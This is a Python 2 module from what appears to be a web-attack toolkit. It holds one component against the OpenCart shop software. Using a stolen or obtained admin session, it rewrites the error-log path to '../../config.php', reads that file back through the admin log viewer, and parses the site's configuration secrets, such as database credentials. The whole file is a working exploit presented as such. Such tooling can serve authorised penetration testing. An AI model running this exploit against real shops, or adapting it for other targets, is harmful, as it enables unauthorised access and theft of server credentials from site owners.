import re
from datetime import date
from pycurl import URL, HTTP_CODE, WRITEFUNCTION, COOKIE, POSTFIELDS
from urlparse import urljoin

from wat import conf
from wat.components.website.cms.opencart.config import parse_configuration
from wat.lib import clients
from wat.lib.components import WatComponent, info, MetaComponent
from wat.lib.exceptions import ComponentFailure
from wat.lib.models import Author
from wat.lib.properties import Property, Constraint


@info(
    authors=[
        Author(email="francesco.mrn24@gmail.com", name="Francesco Marano", nickname="mrnfrancesco"),
    ],
    released=date(2015, 01, 03),
    updated=date(2015, 01, 03),
    version='0.9.1',
    preconditions=[
        Constraint("website.cms.name", 'opencart', 'eq'),
        Property("website.cms.opencart.admin.directory"),
        Property("website.cms.opencart.admin.session"),
        Property("website.cms.opencart.settings"),
    ]
)
class GetConfigParameters(WatComponent):
    """Get the OpenCart configuration parameters by parsing config.php file red from error log file."""
    __metaclass__ = MetaComponent

    def __init__(self):
        super(GetConfigParameters, self).__init__()

        self.session = self.precondition('website.cms.opencart.admin.session')
        self.admin_dir = self.precondition("website.cms.opencart.admin.directory")

        self.curl = clients.Curl()
        self.curl.setopt(WRITEFUNCTION, self.save_as_attribute('body'))
        self.curl.setopt(COOKIE, 'PHPSESSID=%s; Path=/' % self.session['phpsessid'])

    def change_log_file(self, path=None):
        url = urljoin(
            conf.clients.instance().URL,
            self.admin_dir + 'index.php?route=setting/setting&token=' + self.session['token']
        )
        self.curl.setopt(URL, url)
        settings = self.precondition('website.cms.opencart.settings')
        if path is not None:
            settings['config_error_log'] = '1'
            settings['config_error_filename'] = path
        from urllib import urlencode
        self.curl.setopt(POSTFIELDS, urlencode(settings))
        self.curl.perform()
        return self.curl.getinfo(HTTP_CODE) == 302

    def run(self):
        if not self.change_log_file('../../config.php'):
            raise ComponentFailure('Unable to exploit vulnerability')

        url = urljoin(
            conf.clients.instance().URL,
            self.admin_dir + 'index.php?route=tool/error_log&token=' + self.session['token']
        )
        self.curl.setopt(URL, url)
        self.curl.perform()
        http_code = self.curl.getinfo(HTTP_CODE)
        print self.change_log_file()
        if http_code == 200:
            if not self.body:
                raise ComponentFailure('Server sent an empty response')
            else:
                match = re.search(r'<textarea.*?>(?P<log>.*?)</textarea>', self.body, flags=re.DOTALL)
                if match is not None:
                    return parse_configuration(match.group('log'))
                else:
                    raise ComponentFailure("Unable to retrieve log file content")
        else:
            raise ComponentFailure("Server response HTTP status code was %d, 200 expected" % http_code)
